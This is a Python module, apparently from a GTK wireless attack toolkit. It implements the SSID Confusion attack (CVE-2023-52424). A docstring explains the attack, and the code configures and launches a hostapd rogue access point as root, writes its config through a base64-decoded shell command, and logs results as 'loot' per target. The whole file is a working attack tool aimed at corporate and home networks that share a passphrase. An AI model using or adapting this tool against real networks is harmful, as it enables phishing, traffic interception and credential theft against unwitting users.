"""SSID Confusion Attack (CVE-2023-52424, Vanhoef 2024).

The 802.11 standard does not include the SSID in the WPA2/WPA3
4-way handshake key derivation (only BSSID, MAC addresses, nonces
and PMK). So two networks sharing a passphrase but with different
SSIDs -- typical enterprise "corp" + "corp-guest" split, or a
consumer "MyWiFi" + "MyWiFi-Ext" extender chain -- have a
handshake collision.

The attack:

1. Client has ``SSID-A`` and ``SSID-B`` in its PNL, and both use
   the same PSK / EAP creds.
2. Attacker stands up a fake AP with ``SSID-B`` (which nobody is
   supposed to be broadcasting nearby).
3. The client connects to the fake ``SSID-B``, but because the
   4-way handshake key material is identical, from the client's
   IP-stack point of view it thinks it's on ``SSID-A``. Any
   captive portal / auto-open URLs / auto-VPN triggers fire
   as if on ``SSID-A``.

Practical impact is usually a phishing enabler: the client thinks
it's on the trusted corp network, so it hits internal auto-connect
URLs, tries VPN handshake against internal AD, etc. -- all against
our rogue AP acting as ``SSID-B``.

Vanhoef also demonstrated it against Wi-Fi Calling and eduroam
roaming across organisations.

This module is a thin wrapper around ``hostapd`` (with our chosen
PSK) that lets the operator pick two ESSIDs: the one the attacker
advertises, and the one the client will *think* it's on. The
Wi-Fi Alliance's proposed mitigation (draft 802.11 amendment) is
adding the SSID hash to the KDF, but no shipping consumer AP does
that yet.
"""
from __future__ import annotations

import base64
import re
import time
from pathlib import Path

from gi.repository import Adw, GLib, Gtk

from ..executor import Process, Result, run_async
from ..loot_store import get_loot_store, loot_path
from ..module import NHModule, register
from ..widgets import OutputView, toast

DEFAULT_IFACE = "wlan1"

_TMPL = """interface={iface}
driver=nl80211
ssid={ssid_attacker}
hw_mode=g
channel={channel}
wpa=2
wpa_passphrase={psk}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
auth_algs=1
# 802.11w optional; we mirror whatever the victim's real AP has, so
# leave it off by default.
"""


@register
class SSIDConfusion(NHModule):
    title = "SSID Confusion"
    icon = "network-wireless-no-route-symbolic"
    description = ("CVE-2023-52424: client thinks it is on SSID-A "
                   "when it is really on our rogue SSID-B.")
    required_tools = ["hostapd"]

    def __init__(self, app_window):
        super().__init__(app_window)
        self._proc: Process | None = None
        self._loot_id: int | None = None

    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        info = Adw.PreferencesGroup(
            title="How it works",
            description="Client has two SSIDs A and B in its PNL "
                        "sharing a PSK. We advertise B. Client "
                        "associates to B but its IP stack thinks "
                        "it is on A: auto-VPN / auto-mount / "
                        "internal-only URLs all fire.")
        info.add(Adw.ActionRow(
            title="Best target",
            subtitle="Corporate 'corp' + 'corp-guest' with same PSK, "
                     "or 'MyHome' + 'MyHome-Ext' extender split."))
        box.append(info)

        cfg = Adw.PreferencesGroup(title="Rogue AP")
        self.iface = Adw.EntryRow(title="Interface")
        self.iface.set_text(DEFAULT_IFACE)
        cfg.add(self.iface)

        self.ssid_attacker = Adw.EntryRow(
            title="SSID we advertise (attacker's B)")
        cfg.add(self.ssid_attacker)

        self.ssid_victim = Adw.EntryRow(
            title="SSID the client thinks it is on (A)")
        cfg.add(self.ssid_victim)

        self.psk = Adw.PasswordEntryRow(title="Shared PSK")
        cfg.add(self.psk)

        self.channel = Adw.SpinRow.new_with_range(1, 165, 1)
        self.channel.set_title("Channel")
        self.channel.set_value(6)
        cfg.add(self.channel)

        run_row = Adw.ActionRow(title="Start / Stop")
        self.start_btn = Gtk.Button(label="Start",
                                    valign=Gtk.Align.CENTER)
        self.start_btn.add_css_class("suggested-action")
        self.start_btn.connect("clicked", lambda _b: self._start())
        run_row.add_suffix(self.start_btn)
        self.stop_btn = Gtk.Button(label="Stop",
                                   valign=Gtk.Align.CENTER)
        self.stop_btn.set_sensitive(False)
        self.stop_btn.connect("clicked", lambda _b: self._stop())
        run_row.add_suffix(self.stop_btn)
        cfg.add(run_row)
        box.append(cfg)

        self.output = OutputView()
        box.append(self.output)
        return box

    def _start(self) -> None:
        if self._proc is not None and self._proc.running:
            return
        iface = self.iface.get_text().strip() or DEFAULT_IFACE
        ssid_a = self.ssid_attacker.get_text().strip()
        ssid_b = self.ssid_victim.get_text().strip()
        psk = self.psk.get_text().strip() or "welcome123"
        if not ssid_a or not ssid_b:
            toast(self.app_window,
                  "Set both SSIDs first (attacker B and victim A)")
            return
        if len(psk) < 8:
            psk = (psk + "!!!!!!!!")[:16]
        ch = int(self.channel.get_value())

        cfg = _TMPL.format(iface=iface, ssid_attacker=ssid_a,
                           channel=ch, psk=psk)
        conf = "/tmp/nhp-ssid-confusion.conf"
        b64 = base64.b64encode(cfg.encode()).decode()
        run_async(
            ["sh", "-c",
             "printf '%s' | base64 -d > %s" % (b64, conf)],
            lambda _r: None, root=True, timeout=5)

        argv = ["hostapd", "-K", conf]
        self.output.append("$ " + " ".join(argv) + "\n")
        self.output.append("--- config ---\n" + cfg + "---\n")

        stamp = time.strftime("%Y%m%d-%H%M%S")
        log_path = loot_path(
            "ssid_confusion",
            "ssid-confusion-%s.log" % stamp)
        self._loot_id = get_loot_store().record(
            module="ssid_confusion", type="hostapd_log",
            target="attacker=%s victim=%s" % (ssid_a, ssid_b),
            path=log_path,
            notes="CVE-2023-52424 rogue AP")

        def on_line(text: str) -> None:
            self.output.append(text)
            try:
                with open(log_path, "a") as fp:
                    fp.write(text)
            except OSError:
                pass

        def on_done(code: int) -> None:
            self.output.append("[hostapd exited: %d]\n" % code)
            self._proc = None
            self.start_btn.set_sensitive(True)
            self.stop_btn.set_sensitive(False)
            if self._loot_id is not None:
                get_loot_store().refresh_size(self._loot_id)

        self._proc = Process(
            argv, on_line, on_done, root=True)
        self._proc.start()
        self.start_btn.set_sensitive(False)
        self.stop_btn.set_sensitive(True)

    def _stop(self) -> None:
        if self._proc is not None:
            self._proc.stop()
